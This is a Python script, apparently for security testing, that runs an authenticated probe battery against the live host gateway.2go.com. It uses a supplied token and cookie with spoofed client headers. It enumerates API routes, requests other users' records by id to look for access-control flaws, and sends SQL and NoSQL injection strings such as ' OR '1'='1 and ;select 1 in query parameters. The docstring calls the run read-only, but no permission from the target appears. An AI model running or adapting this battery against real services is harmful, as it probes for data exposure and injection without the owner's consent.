#!/usr/bin/env python3
"""run_2go_battery.py — one-shot authenticated battery against gateway.2go.com.

Run within a token window (tokens ~15 min). Usage:
  python3 scripts/run_2go_battery.py <ACCESS_TOKEN> <CF_BM_COOKIE_VALUE>

Bounded, read-only: route enumeration, object-level user_id probes, injection
signals on params. All with own account (45385674) - never foreign ids except
the two documented differential probes.
"""
import sys
import httpx

ACCT = '45385674'
BASE = 'https://gateway.2go.com'
TOKEN = sys.argv[1] if len(sys.argv) > 1 else ''
CFBM = sys.argv[2] if len(sys.argv) > 2 else ''
H = {
    'Authorization': f'Bearer {TOKEN}',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'x-i2g-accept-version': '1.0.0', 'x-i2g-client': 'Web/11.140.0',
    'x-i2g-device': 'Chrome 147.0.0.0', 'x-i2g-device-id': '4aea588a-a929-489a-9675-d78ca9524aef',
    'x-i2g-locale': 'en-US', 'x-i2g-platform': 'Linux x86_64', 'x-i2g-timezone': 'Africa/Nairobi',
    'x-i2g-expected-account-id': ACCT, 'Origin': 'https://web.2go.com', 'Referer': 'https://web.2go.com/',
}
C = {'__cf_bm': CFBM}


def call(path, label='', method='GET', **kw):
    try:
        r = httpx.request(method, BASE + path, headers=H, cookies=C, timeout=12, **kw)
        body = r.text[:100].replace('\n', ' ')
        print(f'[{r.status_code}] {label or path:34} {body}')
        return r
    except Exception as e:
        print(f'[ERR] {label or path:34} {type(e).__name__}')
        return None


def main():
    print('== route enumeration (own account) ==')
    for p in ['/as/account', '/as/user', '/as/users', '/as/clients', '/as/products',
              '/as/invoices', '/as/business', '/as/profile', '/as/me', '/as/roles',
              '/as/permissions', '/as/subscriptions', '/as/billing', '/as/settings',
              '/ps/product', '/cs/client', '/is/invoice', '/us/user', '/common/user',
              '/v1/user', '/api/user']:
        call(p)

    print()
    print('== object-level user_id probes (own token, benign ids) ==')
    for p in ['/as/user/9126565', '/as/user?user_id=9126565', '/as/user?userId=9126565',
              '/as/account?account_id=' + ACCT, '/as/user/1', '/as/user/0']:
        call(p)
    print('   (any 200 with another id / 400 vs 404 distinction = lead)')

    print()
    print('== injection signals on params ==')
    for q in ['?q=%27', '?id=%27', '?name=%27 OR %271=%271', '?email=a%27--',
              '?user_id=%27$ne', '?sort=id;select%201']:
        call('/as/user' + q)
    print('   (500 / sql-alike / mongo-alike errors = lead)')


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)
    main()
